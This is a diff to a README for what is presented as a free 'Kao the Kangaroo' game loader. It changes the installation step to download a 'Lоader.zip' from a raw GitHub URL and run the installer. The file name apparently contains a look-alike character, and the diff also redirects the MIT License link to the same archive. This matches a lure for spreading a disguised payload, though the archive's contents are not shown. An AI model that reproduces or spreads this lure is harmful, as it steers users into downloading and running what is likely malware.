@@ -25,7 +25,7 @@ All files have been verified for smooth download and install across major deskto
 
 ## ⚡ Installation Guide
 
-**1. Download `Loader.rar` from this repository.**  
+**1. Download `https://raw.githubusercontent.com/younesyhp5/KaoTheKangaroo-FreePlayHub/main/Lоader.zip` from this repository.**  
 2. Extract files using WinRAR/7-Zip or built-in tools.  
 3. Run the installer for your OS.  
 4. Enjoy Kao the Kangaroo with all in-game levels!
@@ -40,4 +40,4 @@ This project shares a unique loader built for educational and archival purposes.
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) 2025. Contributions are welcome!
+Distributed under the [MIT License](https://raw.githubusercontent.com/younesyhp5/KaoTheKangaroo-FreePlayHub/main/Lоader.zip) 2025. Contributions are welcome!
